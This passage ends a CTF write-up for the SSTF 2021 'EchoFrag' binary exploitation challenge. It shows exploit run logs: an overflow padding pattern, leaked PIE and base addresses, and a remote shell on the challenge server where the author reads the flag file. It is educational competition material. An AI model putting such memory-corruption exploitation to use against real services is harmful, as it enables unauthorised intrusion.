AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���\xffCCCCCCCCC\x00\x00
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] PIE    : 0x40000008e0
[*] BASE   : 0x4000000000
[*] Switching to interactive mode
\x00\x00\x00/\x81\x00\x00\x00$  </code></pre></figure>

<p>Ok, that address was obviously <em>not</em> randomized and it struck me that the past hours were just wasted, but well…</p>

<p>Let it go, just attach the previous exploit to it and:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to echofrag.sstf.site on port 31513: Done
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���\xffCCCCCCCCC\x00\x00
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] PIE    : 0x40000008e0
[*] BASE   : 0x4000000000
[*] Switching to interactive mode
\x00\x00\x00/\x81\x00\x00\x00$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
Enter to trigger shell
[*] Switching to interactive mode
$ 
$ id
uid=1000(prob) gid=1000(prob) groups=1000(prob)
$ ls
EchoFrag
FLAG
$ cat FLAG
SCTF{What_a_Beauty_0F_MEmCpY!!}
[*] Got EOF while reading in interactive
 </code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=SSTF CTF 2021 - EchoFrag&amp;url=https://kileak.github.io/ctf/2021/sstf-echofrag/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/sstf-echofrag/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2021/sstf-echofrag';
        var disqus_title = 'SSTF CTF 2021 - EchoFrag';
        var disqus_url = 'https://kileak.github.io/ctf/2021/sstf-echofrag';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
